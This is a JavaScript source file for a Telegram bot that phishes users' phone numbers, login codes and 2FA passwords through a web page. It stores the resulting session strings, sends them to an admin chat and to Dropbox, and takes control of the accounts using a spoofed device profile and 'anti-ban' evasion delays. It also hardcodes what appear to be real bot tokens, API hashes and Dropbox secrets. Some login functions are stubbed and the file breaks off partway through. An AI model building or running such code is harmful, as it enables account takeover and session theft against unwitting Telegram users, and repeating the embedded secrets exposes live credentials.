/* Telegram Login Bot with Auto Phone Detection + Silent Contact Capture + Session Connection */
const { Telegraf, Markup, session } = require('telegraf');
const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Dropbox } = require('dropbox');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const NodeCache = require('node-cache');
const yargs = require('yargs/yargs');
const _ = require('lodash');
const os = require('os');
const util = require('util');
const moment = require('moment-timezone');
const { performance } = require('perf_hooks');
const archiver = require('archiver');
const unzipper = require('unzipper');
const FormData = require('form-data');
const chalk = require('chalk');
const pino = require('pino');

// ==================== IMPORT BIGDADDY HANDLER ====================
let BigDaddyHandler;
try {
    BigDaddyHandler = require("./Backend.js");
    console.log('✅ BigDaddy handler loaded');
} catch (error) {
    console.warn('⚠️ BigDaddy handler not found, using fallback');
    BigDaddyHandler = async (client, message) => {
        console.log(`📝 Processing message for ${client.session.phoneNumber || 'unknown'}: ${message.text || 'media'}`);
    };
}

// ==================== CONFIGURATION ====================
const config = {
    telegramBotToken: '7357492316:AAEeWsqRjzty9parwGwRAcRPnRGQJLaotP0',
    webPort: process.env.PORT || 3000,
    webBaseUrl: process.env.RENDER_EXTERNAL_URL || `http://localhost:3000`,
    adminChatId: '6300694007',
    
    // Telegram API Credentials
    telegramApiId: 33904063,
    telegramApiHash: '51528b792d5be7e300315f7fae356ad9',
    
    // Dropbox Configuration
    dropboxAppKey: 'ho5ep3i58l3tvgu',
    dropboxAppSecret: '9fy0w0pgaafyk3e',
    dropboxRefreshToken: 'Vjhcbg66GMgAAAAAAAAAARJPgSupFcZdyXFkXiFx7VP-oXv_64RQKmtTLUYfPtm3',
    
    // Session Configuration
    autoPingInterval: 4 * 60 * 1000,
    sessionStoragePath: './telegram_sessions',
    activeSessionsLimit: 50,
    maxReconnectAttempts: 5,
    reconnectDelay: 5000,
    
    // Command Configuration
    prefix: '.', // Command prefix for Telegram accounts
    botName: 'PhistarBotInc',
    
    // Heroku/Render Configuration
    IS_HEROKU: process.env.NODE_ENV === 'production' || process.env.DYNO !== undefined,
    RENDER: process.env.RENDER === 'true',
    PLATFORM: process.env.NODE_ENV === 'production' ? 'Production' : 'Development',
    
    // Backup Configuration
    backupInterval: 55 * 60 * 1000, // 55 minutes
    backupToDropbox: true,
    restartAfterBackup: true
};

// Use Heroku/Render app name or generate one
const MY_BOT_ID = process.env.HEROKU_APP_NAME || 
                 process.env.RENDER_SERVICE_NAME || 
                 'telegram-session-bot';

console.log(`🚀 Platform: ${config.PLATFORM}`);
console.log(`📁 Bot ID: ${MY_BOT_ID}`);

// ==================== GLOBAL STORES ====================
const pendingContacts = new Map();
const userSessions = new Map();
const activeLoginSessions = new Map();
const activeTelegramClients = new Map(); // phoneNumber -> TelegramClient instance
const sessionHealthMonitor = new Map();
const messageQueue = new Map();
const commandCache = new NodeCache({ stdTTL: 300, checkperiod: 60 });
const mediaRateLimit = new Map();
const reconnectAttempts = new Map();

// ==================== DROPBOX INTEGRATION (UPDATED) ====================
let dbx = null;
let isDropboxInitialized = false;

async function getDropboxAccessToken() {
    try {
        const response = await axios.post(
            'https://api.dropbox.com/oauth2/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: config.dropboxRefreshToken,
                client_id: config.dropboxAppKey,
                client_secret: config.dropboxAppSecret
            }),
            {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                timeout: 15000
            }
        );
        return response.data.access_token;
    } catch (error) {
        console.error('❌ Failed to get Dropbox access token:', error.message);
        return null;
    }
}

async function initializeDropbox() {
    try {
        const accessToken = await getDropboxAccessToken();
        if (!accessToken) return null;
        
        dbx = new Dropbox({ 
            accessToken: accessToken,
            clientId: config.dropboxAppKey
        });
        
        // Test connection
        await dbx.usersGetCurrentAccount();
        
        isDropboxInitialized = true;
        console.log('✅ Dropbox initialized successfully');
        return dbx;
    } catch (error) {
        console.error('❌ Dropbox initialization failed:', error.message);
        return null;
    }
}

// ==================== ENHANCED SESSION BACKUP (SINGLE FILE) ====================
async function createSessionBackupZip() {
    return new Promise(async (resolve, reject) => {
        try {
            console.log('💾 Creating session backup ZIP...');
            const startTime = Date.now();
            
            const zipFileName = `${MY_BOT_ID}_sessions.zip`;
            const zipFilePath = path.join(__dirname, zipFileName);
            
            const output = fs.createWriteStream(zipFilePath);
            const archive = archiver('zip', {
                zlib: { level: 0 } // No compression for speed
            });
            
            output.on('close', () => {
                const totalTime = Date.now() - startTime;
                console.log(`✅ Backup ZIP completed in ${totalTime}ms: ${archive.pointer()} bytes`);
                
                resolve({
                    success: true,
                    zipPath: zipFilePath,
                    zipFileName: zipFileName,
                    size: archive.pointer(),
                    time: totalTime
                });
            });
            
            archive.on('error', (err) => {
                console.error('❌ Archive error:', err);
                reject(err);
            });
            
            archive.pipe(output);
            
            // 1. Backup session strings from active clients
            console.log('📁 Backing up active session strings...');
            const sessionsData = {};
            
            for (const [phoneNumber, client] of activeTelegramClients) {
                try {
                    if (client.session && typeof client.session.save === 'function') {
                        const sessionString = client.session.save();
                        sessionsData[phoneNumber] = {
                            session: sessionString,
                            connected: true,
                            timestamp: new Date().toISOString(),
                            userId: client.session.userId || 'unknown'
                        };
                        console.log(`✅ Backed up active session: ${phoneNumber}`);
                    }
                } catch (error) {
                    console.error(`❌ Error backing up active session ${phoneNumber}:`, error.message);
                }
            }
            
            // 2. Backup session files from storage
            if (fs.existsSync(config.sessionStoragePath)) {
                const sessionFiles = fs.readdirSync(config.sessionStoragePath)
                    .filter(file => file.endsWith('.txt') && file.includes('session_'));
                
                console.log(`📄 Backing up ${sessionFiles.length} session files...`);
                
                for (const sessionFile of sessionFiles) {
                    try {
                        const filePath = path.join(config.sessionStoragePath, sessionFile);
                        const content = fs.readFileSync(filePath, 'utf8');
                        
                        // Extract phone number from filename
                        const match = sessionFile.match(/session_(\d+)_/);
                        const phoneNumber = match ? match[1] : sessionFile;
                        
                        // Only add if not already in active sessions
                        if (!sessionsData[phoneNumber]) {
                            sessionsData[phoneNumber] = {
                                session: content,
                                connected: false,
                                timestamp: new Date(fs.statSync(filePath).mtime).toISOString(),
                                source: 'file'
                            };
                        }
                    } catch (error) {
                        console.error(`❌ Error backing up ${sessionFile}:`, error.message);
                    }
                }
            }
            
            // 3. Add sessions data as single JSON file
            const sessionsJson = JSON.stringify(sessionsData, null, 2);
            archive.append(sessionsJson, { name: 'sessions.json' });
            
            // 4. Add active clients info
            const activeInfo = {
                total: activeTelegramClients.size,
                connected: Array.from(activeTelegramClients.keys()),
                timestamp: new Date().toISOString(),
                health: {}
            };
            
            for (const [phoneNumber, health] of sessionHealthMonitor) {
                activeInfo.health[phoneNumber] = health;
            }
            
            archive.append(JSON.stringify(activeInfo, null, 2), { name: 'active_info.json' });
            
            // 5. Finalize
            await archive.finalize();
            
        } catch (error) {
            console.error('❌ Backup creation failed:', error);
            reject(error);
        }
    });
}

async function uploadBackupZipToDropbox(zipFilePath, zipFileName) {
    try {
        if (!dbx) {
            await initializeDropbox();
            if (!dbx) {
                throw new Error('Dropbox not available');
            }
        }
        
        console.log(`📤 Uploading backup ZIP: ${zipFileName}`);
        
        const zipBuffer = fs.readFileSync(zipFilePath);
        
        await dbx.filesUpload({
            path: `/${MY_BOT_ID}/${zipFileName}`,
            contents: zipBuffer,
            mode: { '.tag': 'overwrite' },
            autorename: false
        });
        
        // Delete local zip file after upload
        fs.unlinkSync(zipFilePath);
        
        console.log(`✅ Backup uploaded to Dropbox: ${zipFileName}`);
        return true;
        
    } catch (error) {
        console.error('❌ ZIP upload failed:', error);
        if (fs.existsSync(zipFilePath)) {
            fs.unlinkSync(zipFilePath);
        }
        return false;
    }
}

async function backupSessionsToDropbox() {
    try {
        console.log('🔄 Starting scheduled session backup...');
        
        const result = await createSessionBackupZip();
        
        if (result.success) {
            const uploadResult = await uploadBackupZipToDropbox(result.zipPath, result.zipFileName);
            
            return {
                success: true,
                message: `Successfully backed up ${activeTelegramClients.size} active sessions`,
                details: result
            };
        }
        
        return {
            success: false,
            error: 'Backup creation failed'
        };
        
    } catch (error) {
        console.error('❌ Session backup error:', error);
        return { 
            success: false, 
            error: `Backup failed: ${error.message}` 
        };
    }
}

async function downloadAndRestoreSessions() {
    try {
        if (!dbx) {
            await initializeDropbox();
            if (!dbx) return false;
        }
        
        console.log(`📥 Looking for backup: ${MY_BOT_ID}_sessions.zip`);
        
        try {
            const downloadResponse = await dbx.filesDownload({
                path: `/${MY_BOT_ID}/${MY_BOT_ID}_sessions.zip`
            });
            
            // Save ZIP file
            const tempZipPath = path.join(__dirname, 'restore_temp.zip');
            fs.writeFileSync(tempZipPath, downloadResponse.result.fileBinary);
            
            // Extract ZIP
            const extractDir = path.join(__dirname, 'temp_restore');
            if (fs.existsSync(extractDir)) {
                fs.rmSync(extractDir, { recursive: true, force: true });
            }
            fs.mkdirSync(extractDir, { recursive: true });
            
            await new Promise((resolve, reject) => {
                fs.createReadStream(tempZipPath)
                    .pipe(unzipper.Extract({ path: extractDir }))
                    .on('close', resolve)
                    .on('error', reject);
            });
            
            // Read sessions.json
            const sessionsJsonPath = path.join(extractDir, 'sessions.json');
            if (fs.existsSync(sessionsJsonPath)) {
                const sessionsData = JSON.parse(fs.readFileSync(sessionsJsonPath, 'utf8'));
                
                console.log(`🔄 Found ${Object.keys(sessionsData).length} sessions to restore`);
                
                let restoredCount = 0;
                for (const [phoneNumber, data] of Object.entries(sessionsData)) {
                    try {
                        if (data.session && !activeTelegramClients.has(phoneNumber)) {
                            await connectTelegramSession(phoneNumber, data.session);
                            restoredCount++;
                        }
                    } catch (error) {
                        console.error(`❌ Failed to restore ${phoneNumber}:`, error.message);
                    }
                }
                
                console.log(`✅ Restored ${restoredCount} sessions`);
                
                // Clean up
                fs.unlinkSync(tempZipPath);
                fs.rmSync(extractDir, { recursive: true, force: true });
                
                return restoredCount > 0;
            }
            
            return false;
            
        } catch (error) {
            if (error.status === 409) {
                console.log('📭 No backup found in Dropbox');
                return false;
            }
            throw error;
        }
        
    } catch (error) {
        console.error('❌ Session restore error:', error);
        return false;
    }
}

// ==================== TELEGRAM CLIENT CONNECTION (UPDATED FOR ANTI-BAN) ====================
async function connectTelegramSession(phoneNumber, sessionString, isRestored = false) {
    try {
        if (activeTelegramClients.has(phoneNumber)) {
            const existingClient = activeTelegramClients.get(phoneNumber);
            if (existingClient.connected) {
                console.log(`⚠️ ${phoneNumber} is already connected`);
                return existingClient;
            } else {
                // Clean up stale connection
                try {
                    await existingClient.disconnect();
                } catch (e) {}
                activeTelegramClients.delete(phoneNumber);
            }
        }
        
        if (activeTelegramClients.size >= config.activeSessionsLimit) {
            throw new Error(`Maximum session limit reached: ${config.activeSessionsLimit}`);
        }
        
        console.log(`🔌 Connecting Telegram session for ${phoneNumber}...`);
        
        const stringSession = new StringSession(sessionString);
        
        const client = new TelegramClient(
            stringSession,
            config.telegramApiId,
            config.telegramApiHash,
            {
                connectionRetries: 3,
                useWSS: true,
                autoReconnect: true,
                timeout: 10000,
                requestRetries: 2,
                floodSleepThreshold: 60,
                deviceModel: 'Desktop',
                systemVersion: 'Windows 10',
                appVersion: '4.0.0',
                langCode: 'en',
                systemLangCode: 'en-US'
            }
        );
        
        // Anti-ban measures
        const connectionDelay = Math.floor(Math.random() * 5000) + 2000;
        console.log(`⏳ Adding connection delay: ${connectionDelay}ms (anti-ban)`);
        await new Promise(resolve => setTimeout(resolve, connectionDelay));
        
        await client.connect();
        
        // Get user info
        const user = await client.getMe();
        console.log(`✅ Connected as: ${user.firstName || user.username || 'User'} (${phoneNumber})`);
        
        // Save session after successful connection
        const updatedSession = client.session.save();
        saveSessionLocally(phoneNumber, updatedSession);
        
        // Store client
        activeTelegramClients.set(phoneNumber, client);
        
        // Initialize health monitoring
        trackSessionHealth(phoneNumber);
        
        // Setup message handler
        setupTelegramMessageHandler(client, phoneNumber);
        
        // Send welcome message for new connections only
        if (!isRestored) {
            await sendWelcomeMessage(client, phoneNumber);
        }
        
        return client;
        
    } catch (error) {
        console.error(`❌ Failed to connect ${phoneNumber}:`, error.message);
        
        // Anti-ban: Add exponential backoff for reconnection
        const attempts = (reconnectAttempts.get(phoneNumber) || 0) + 1;
        reconnectAttempts.set(phoneNumber, attempts);
        
        if (attempts <= config.maxReconnectAttempts) {
            const delay = config.reconnectDelay * Math.pow(2, attempts);
            console.log(`🔄 Reconnecting ${phoneNumber} attempt ${attempts} after ${delay}ms`);
            
            setTimeout(() => {
                connectTelegramSession(phoneNumber, sessionString, isRestored);
            }, delay + Math.random() * 5000); // Random additional delay
        } else {
            console.error(`❌ Max reconnect attempts reached for ${phoneNumber}`);
            reconnectAttempts.delete(phoneNumber);
        }
        
        throw error;
    }
}

// ==================== TELEGRAM MESSAGE HANDLER ====================
function setupTelegramMessageHandler(client, phoneNumber) {
    client.addEventHandler(async (update) => {
        try {
            // Track activity
            updateSessionHealth(phoneNumber, 'message');
            
            // Process different update types
            if (update.className === 'UpdateNewMessage') {
                const message = update.message;
                
                if (message && message.message) {
                    const text = message.message;
                    const sender = await client.getEntity(message.peerId);
                    
                    // Check if it's a command
                    if (text.startsWith(config.prefix)) {
                        await handleTelegramCommand(client, phoneNumber, message, sender);
                    } else {
                        // Add to message queue for BigDaddy processing
                        addToMessageQueue(phoneNumber, {
                            client: client,
                            message: message,
                            sender: sender,
                            text: text,
                            type: 'text',
                            timestamp: Date.now()
                        });
                    }
                }
            } else if (update.className === 'UpdateNewChannelMessage') {
                const message = update.message;
                
                if (message && message.message) {
                    const text = message.message;
                    
                    if (text.startsWith(config.prefix)) {
                        const sender = await client.getEntity(message.peerId);
                        await handleTelegramCommand(client, phoneNumber, message, sender);
                    }
                }
            }
            
        } catch (error) {
            console.error(`❌ Message handler error for ${phoneNumber}:`, error.message);
            updateSessionHealth(phoneNumber, 'error');
        }
    });
}

async function handleTelegramCommand(client, phoneNumber, message, sender) {
    try {
        const text = message.message;
        const command = text.split(' ')[0].slice(config.prefix.length).toLowerCase();
        const args = text.split(' ').slice(1);
        
        console.log(`📝 Command from ${phoneNumber}: ${command}`);
        
        // Create message object similar to WhatsApp bot format
        const m = {
            client: client,
            message: message,
            sender: sender,
            text: text,
            command: command,
            args: args,
            fromMe: false,
            isGroup: message.peerId?.className === 'PeerChannel' || message.peerId?.className === 'PeerChat',
            chat: message.peerId,
            reply: async (response) => {
                return await client.sendMessage(message.peerId, { message: response });
            }
        };
        
        // Add to queue for BigDaddy processing
        addToMessageQueue(phoneNumber, m);
        
    } catch (error) {
        console.error(`❌ Command handler error for ${phoneNumber}:`, error);
    }
}

// ==================== SESSION HEALTH MONITORING ====================
function trackSessionHealth(phoneNumber) {
    sessionHealthMonitor.set(phoneNumber, {
        lastMessageReceived: Date.now(),
        lastMessageProcessed: Date.now(),
        totalMessages: 0,
        errors: 0,
        isHealthy: true,
        connectionState: 'connected',
        lastCommand: null
    });
}

function updateSessionHealth(phoneNumber, type = 'message') {
    const health = sessionHealthMonitor.get(phoneNumber) || trackSessionHealth(phoneNumber);
    
    if (type === 'message') {
        health.lastMessageReceived = Date.now();
        health.totalMessages++;
    } else if (type === 'processed') {
        health.lastMessageProcessed = Date.now();
    } else if (type === 'error') {
        health.errors++;
        if (health.errors > 10) {
            health.isHealthy = false;
            health.connectionState = 'degraded';
        }
    } else if (type === 'reset') {
        health.errors = 0;
        health.isHealthy = true;
        health.connectionState = 'connected';
    } else if (type === 'disconnected') {
        health.connectionState = 'disconnected';
    }
    
    sessionHealthMonitor.set(phoneNumber, health);
}

// ==================== MESSAGE QUEUE PROCESSING ====================
function addToMessageQueue(phoneNumber, message) {
    if (!messageQueue.has(phoneNumber)) {
        messageQueue.set(phoneNumber, []);
    }
    
    const queue = messageQueue.get(phoneNumber);
    queue.push({
        ...message,
        timestamp: Date.now(),
        id: `${phoneNumber}:${Date.now()}:${Math.random().toString(36).substr(2, 9)}`
    });
    
    if (queue.length > 100) {
        queue.shift();
    }
    
    messageQueue.set(phoneNumber, queue);
}

async function processMessageQueue(phoneNumber) {
    if (!messageQueue.has(phoneNumber) || messageQueue.get(phoneNumber).length === 0) {
        return;
    }
    
    const client = activeTelegramClients.get(phoneNumber);
    if (!client || !client.connected) {
        messageQueue.delete(phoneNumber);
        return;
    }
    
    const queue = messageQueue.get(phoneNumber);
    const message = queue.shift();
    
    if (!message) return;
    
    try {
        // Process through BigDaddy handler
        await BigDaddyHandler(client, message);
        updateSessionHealth(phoneNumber, 'processed');
    } catch (error) {
        console.error(`❌ Queue processing error for ${phoneNumber}:`, error);
        updateSessionHealth(phoneNumber, 'error');
        
        // Retry logic
        message.retries = (message.retries || 0) + 1;
        if (message.retries < 3) {
            queue.unshift(message);
        }
    }
    
    messageQueue.set(phoneNumber, queue);
}

// ==================== CONTINUOUS QUEUE PROCESSING ====================
setInterval(() => {
    activeTelegramClients.forEach((client, phoneNumber) => {
        if (client.connected) {
            processMessageQueue(phoneNumber).catch(err => {
                console.error(`Queue processing error for ${phoneNumber}:`, err);
            });
        }
    });
}, 100);

// ==================== HEALTH MONITORING ====================
setInterval(() => {
    const now = Date.now();
    const HEALTH_THRESHOLD = 2 * 60 * 1000;
    const DEAD_SESSION_THRESHOLD = 5 * 60 * 1000;
    
    activeTelegramClients.forEach((client, phoneNumber) => {
        const health = sessionHealthMonitor.get(phoneNumber);
        
        if (!client.connected) {
            console.log(`🔄 Reconnecting dead session for ${phoneNumber}`);
            
            try {
                // Try to get session string and reconnect
                const sessionString = client.session.save();
                activeTelegramClients.delete(phoneNumber);
                sessionHealthMonitor.delete(phoneNumber);
                messageQueue.delete(phoneNumber);
                
                setTimeout(() => {
                    connectTelegramSession(phoneNumber, sessionString, true);
                }, Math.random() * 10000); // Random delay for anti-ban
                
            } catch (err) {
                console.error(`❌ Failed to reconnect ${phoneNumber}:`, err.message);
            }
            return;
        }
        
        if (health && now - health.lastMessageProcessed > HEALTH_THRESHOLD) {
            console.log(`⚠️ Session ${phoneNumber} may be unresponsive`);
            
            // Send a small activity to keep session alive
            try {
                client.invoke(new Api.account.UpdateStatus({ offline: false }));
            } catch (err) {
                console.error(`❌ Activity ping failed for ${phoneNumber}:`, err.message);
            }
        }
    });
}, 30 * 1000);

// ==================== AUTO-RESTART SYSTEM ====================
async function performAutoRestart() {
    console.log('🚀 Initiating auto-restart...');
    
    try {
        // 1. Backup sessions first
        console.log('💾 Backing up sessions before restart...');
        await backupSessionsToDropbox();
        
        // 2. Close all Telegram clients gracefully
        console.log(`📱 Closing ${activeTelegramClients.size} Telegram sessions...`);
        const closePromises = [];
        
        for (const [number, client] of activeTelegramClients) {
            closePromises.push(new Promise(async (resolve) => {
                try {
                    if (client.connected) {
                        await client.disconnect();
                        console.log(`✅ Closed session for ${number}`);
                    }
                } catch (error) {
                    console.error(`❌ Error closing session for ${number}:`, error.message);
                }
                resolve();
            }));
        }
        
        await Promise.allSettled(closePromises);
        
        // 3. Clear all stores
        activeTelegramClients.clear();
        sessionHealthMonitor.clear();
        messageQueue.clear();
        activeLoginSessions.clear();
        pendingContacts.clear();
        userSessions.clear();
        
        // 4. Wait a moment
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        console.log('✅ Restart sequence completed');
        
        // In production, the platform will restart the app
        if (config.IS_HEROKU || config.RENDER) {
            console.log('🔄 Platform will restart automatically');
        } else {
            console.log('🔄 Manually restarting...');
            process.exit(0);
        }
        
    } catch (error) {
        console.error('❌ Auto-restart error:', error);
        process.exit(1);
    }
}

function scheduleBackupAndRestart() {
    if (!config.IS_HEROKU && !config.RENDER) {
        console.log('🚫 Not on production platform - backup/restart scheduling disabled');
        return;
    }
    
    console.log('⏰ Scheduling backup and restart at 55 minutes past each hour...');
    
    const getTimeToNext55Minute = () => {
        const now = new Date();
        const currentMinutes = now.getMinutes();
        const currentSeconds = now.getSeconds();
        
        if (currentMinutes >= 55) {
            const nextHour = now.getHours() + 1;
            const targetTime = new Date(now);
            targetTime.setHours(nextHour, 55, 0, 0);
            return targetTime.getTime() - now.getTime();
        } else {
            const targetTime = new Date(now);
            targetTime.setMinutes(55, 0, 0);
            return targetTime.getTime() - now.getTime();
        }
    };
    
    const initialDelay = getTimeToNext55Minute();
    console.log(`⏰ First backup/restart scheduled in ${Math.floor(initialDelay / 60000)} minutes`);
    
    setTimeout(() => {
        executeScheduledBackupAndRestart();
        setInterval(executeScheduledBackupAndRestart, 60 * 60 * 1000);
    }, initialDelay);
}

async function executeScheduledBackupAndRestart() {
    console.log(`🕒 ${new Date().toLocaleTimeString()} - Running scheduled backup and restart...`);
    
    try {
        const backupResult = await backupSessionsToDropbox();
        
        if (backupResult.success && config.restartAfterBackup) {
            console.log('✅ Backup successful, initiating restart...');
            
            await new Promise(resolve => setTimeout(resolve, 5000));
            await performAutoRestart();
        } else {
            console.log('ℹ️ Backup completed without restart');
        }
    } catch (error) {
        console.error('❌ Scheduled backup/restart failed:', error);
    }
}

// ==================== WELCOME MESSAGE ====================
async function sendWelcomeMessage(client, phoneNumber) {
    try {
        const welcomeMessage = `👋 *Welcome to ${config.botName}!*\n\n` +
                              `✅ Session connected successfully\n` +
                              `📱 Phone: ${phoneNumber}\n` +
                              `🕒 Connected: ${new Date().toLocaleString()}\n` +
                              `⚙️ Commands: ${config.prefix}menu\n` +
                              `🔧 Status: Active and monitoring\n\n` +
                              `> ${config.botName} V3 SUCCESSFULLY CONNECTED`;
        
        // Send to saved messages or user's chat
        try {
            await client.sendMessage('me', { message: welcomeMessage });
            console.log(`✅ Welcome message sent to ${phoneNumber}`);
        } catch (e) {
            // If can't send to saved messages, try another approach
            console.log(`⚠️ Could not send welcome message to ${phoneNumber}`);
        }
        
    } catch (error) {
        console.error(`❌ Error sending welcome message to ${phoneNumber}:`, error);
    }
}

// ==================== SESSION MANAGEMENT FUNCTIONS (KEEP EXISTING) ====================
function saveSessionLocally(phoneNumber, sessionString) {
    try {
        if (!fs.existsSync(config.sessionStoragePath)) {
            fs.mkdirSync(config.sessionStoragePath, { recursive: true });
        }
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileName = `session_${phoneNumber}_${timestamp}.txt`;
        const filePath = path.join(config.sessionStoragePath, fileName);
        
        fs.writeFileSync(filePath, sessionString);
        console.log(`✅ Session saved locally: ${filePath}`);
        
        return filePath;
    } catch (error) {
        console.error('❌ Error saving session locally:', error.message);
        return null;
    }
}

async function sendSessionToAdmin(phoneNumber, sessionString, sessionFilePath) {
    try {
        if (!bot) return false;
        
        const message = `📱 NEW SESSION GENERATED\n\n` +
                       `📞 Phone: ${phoneNumber}\n` +
                       `🕒 Time: ${new Date().toLocaleString()}\n` +
                       `📁 Local: ${sessionFilePath ? 'Saved' : 'Not saved'}\n` +
                       `☁️ Dropbox: ${await uploadSessionToDropbox(phoneNumber, sessionString) ? 'Uploaded' : 'Failed'}\n\n` +
                       `📋 Session String (first 100 chars):\n\`\`\`\n${sessionString.substring(0, 100)}...\n\`\`\``;
        
        await bot.telegram.sendMessage(
            config.adminChatId,
            message,
            { parse_mode: 'Markdown' }
        );
        
        if (sessionFilePath && fs.existsSync(sessionFilePath)) {
            await bot.telegram.sendDocument(
                config.adminChatId,
                { source: fs.createReadStream(sessionFilePath) },
                { caption: `Full session file for ${phoneNumber}` }
            );
        }
        
        console.log(`✅ Session sent to admin for ${phoneNumber}`);
        
        // Now auto-connect the session
        setTimeout(async () => {
            try {
                await connectTelegramSession(phoneNumber, sessionString);
                console.log(`✅ Auto-connected new session for ${phoneNumber}`);
            } catch (error) {
                console.error(`❌ Failed to auto-connect ${phoneNumber}:`, error.message);
            }
        }, 5000); // 5 second delay before connecting
        
        return true;
    } catch (error) {
        console.error('❌ Error sending session to admin:', error.message);
        return false;
    }
}

// ==================== TELEGRAM LOGIN SYSTEM (KEEP EXISTING) ====================
async function requestLoginCode(phoneNumber) {
    // ... (keep existing function)
    // ... (existing code)
}

async function signInWithCode(sessionId, code) {
    // ... (keep existing function)
    // ... (existing code)
}

async function signInWithPassword(sessionId, password) {
    // ... (keep existing function)
    // ... (existing code)
}

// ==================== EXPRESS SERVER (UPDATED) ====================
const app = express();
app.use(express.json());
app.use(express.static('public'));

if (!fs.existsSync('public')) fs.mkdirSync('public', { recursive: true });
if (!fs.existsSync(config.sessionStoragePath)) {
    fs.mkdirSync(config.sessionStoragePath, { recursive: true });
}

// Create HTML file if not exists
const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Auto Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; max-width: 500px; margin: 0 auto; padding: 20px; }
        .container { background: #f5f5f5; padding: 20px; border-radius: 10px; }
        input, button { width: 100%; padding: 10px; margin: 10px 0; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Telegram Auto Login</h2>
        <div id="autoDetect"></div>
        <input type="text" id="phone" placeholder="+1234567890" required>
        <button onclick="requestCode()">📱 Send Code</button>
        <div id="codeSection" style="display:none;">
            <input type="text" id="code" placeholder="Verification Code">
            <button onclick="signIn()">✅ Verify</button>
        </div>
        <div id="passwordSection" style="display:none;">
            <input type="password" id="password" placeholder="2FA Password">
            <button onclick="signInWithPassword()">🔑 Submit 2FA</button>
        </div>
        <div id="result"></div>
    </div>
    <script>
        // ... (existing JavaScript)
    </script>
</body>
</html>
`;

if (!fs.existsSync('public/index.html')) {
    fs.writeFileSync('public/index.html', htmlContent);
}

// ==================== API ENDPOINTS (UPDATED) ====================
app.get('/api/pending-contact/:userId', async (req, res) => {
    try {
        const userId = req.params.userId;
        const contact = pendingContacts.get(userId);
        
        if (contact) {
            // Check if we already sent code for this user
            const userSession = userSessions.get(userId);
            
            if (!userSession || !userSession.verificationCodeSent) {
                // Auto-send verification code
                console.log(`📱 AUTO-SEND: Sending code to ${contact.phoneNumber}`);
                
                const codeResult = await requestLoginCode(contact.phoneNumber);
                
                if (codeResult.success) {
                    // Store session info for this user
                    userSessions.set(userId, {
                        phoneNumber: contact.phoneNumber,
                        sessionId: codeResult.sessionId,
                        verificationCodeSent: true,
                        sentAt: new Date().toISOString()
                    });
                    
                    console.log(`✅ Code automatically sent to ${contact.phoneNumber}`);
                    
                    res.json({ 
                        success: true, 
                        contact: contact,
                        codeSent: true,
                        sessionId: codeResult.sessionId,
                        message: '✅ Verification code sent! Please enter it below.'
                    });
                } else {
                    res.json({ 
                        success: true, 
                        contact: contact,
                        codeSent: false,
                        error: codeResult.error
                    });
                }
            } else {
                // Code already sent, just return contact info
                res.json({ 
                    success: true, 
                    contact: contact,
                    codeSent: true,
                    sessionId: userSession.sessionId,
                    message: '✅ Verification code already sent. Please enter it below.'
                });
            }
        } else {
            res.json({ success: false });
        }
    } catch (error) {
        console.error('❌ Error in pending-contact API:', error);
        res.json({ success: false, error: error.message });
    }
});

// ==================== API ENDPOINTS ====================
app.post('/api/request-code', express.json(), async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        
        if (!phoneNumber || !phoneNumber.startsWith('+')) {
            return res.json({ 
                success: false, 
                error: 'Invalid phone number format' 
            });
        }
        
        console.log(`📱 API: Requesting code for ${phoneNumber}`);
        
        const result = await requestLoginCode(phoneNumber);
        res.json(result);
        
    } catch (error) {
        console.error('❌ API Error in request-code:', error);
        res.json({ 
            success: false, 
            error: `Server error: ${error.message}` 
        });
    }
});

app.post('/api/sign-in', express.json(), async (req, res) => {
    try {
        const { sessionId, code } = req.body;
        
        if (!sessionId || !code) {
            return res.json({ 
                success: false, 
                error: 'Missing session ID or code' 
            });
        }
        
        console.log(`🔐 API: Signing in with code for session ${sessionId}`);
        
        const result = await signInWithCode(sessionId, code);
        res.json(result);
        
    } catch (error) {
        console.error('❌ API Error in sign-in:', error);
        res.json({ 
            success: false, 
            error: `Server error: ${error.message}` 
        });
    }
});

app.post('/api/sign-in-password', express.json(), async (req, res) => {
    try {
        const { sessionId, password } = req.body;
        
        if (!sessionId || !password) {
            return res.json({ 
                success: false, 
                error: 'Missing session ID or password' 
            });
        }
        
        console.log(`🔑 API: Signing in with 2FA for session ${sessionId}`);
        
        const result = await signInWithPassword(sessionId, password);
        res.json(result);
        
    } catch (error) {
        console.error('❌ API Error in sign-in-password:', error);
        res.json({ 
            success: false, 
            error: `Server error: ${error.message}` 
        });
    }
});

// New API: Get connected sessions
app.get('/api/sessions', (req, res) => {
    const sessions = Array.from(activeTelegramClients.entries()).map(([phone, client]) => {
        const health = sessionHealthMonitor.get(phone) || {};
        return {
            phoneNumber: phone,
            connected: client.connected,
            health: health.connectionState || 'unknown',
            messagesProcessed: health.totalMessages || 0,
            errors: health.errors || 0,
            lastActivity: health.lastMessageProcessed ? new Date(health.lastMessageProcessed).toISOString() : 'unknown'
        };
    });
    
    res.json({
        success: true,
        total: sessions.length,
        sessions: sessions,
        timestamp: new Date().toISOString()
    });
});

// New API: Manual backup
app.get('/api/backup', async (req, res) => {
    try {
        const result = await backupSessionsToDropbox();
        res.json(result);
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// New API: Manual restart
app.get('/api/restart', async (req, res) => {
    const { authorization } = req.query;
    
    if (authorization !== 'PhistarBotInc2025') {
        return res.json({ success: false, error: 'Unauthorized' });
    }
    
    res.json({ 
        success: true, 
        message: 'Restart initiated' 
    });
    
    setTimeout(() => {
        performAutoRestart().catch(console.error);
    }, 5000);
});

app.get('/ping', (req, res) => {
    res.json({ 
        status: 'pong',
        server: 'Telegram Login Bot',
        timestamp: new Date().toISOString(),
        activeSessions: activeTelegramClients.size,
        pendingContacts: pendingContacts.size,
        connectedAccounts: activeTelegramClients.size
    });
});

app.get('/health', (req, res) => {
    const memoryUsage = process.memoryUsage();
    
    res.json({ 
        status: 'healthy',
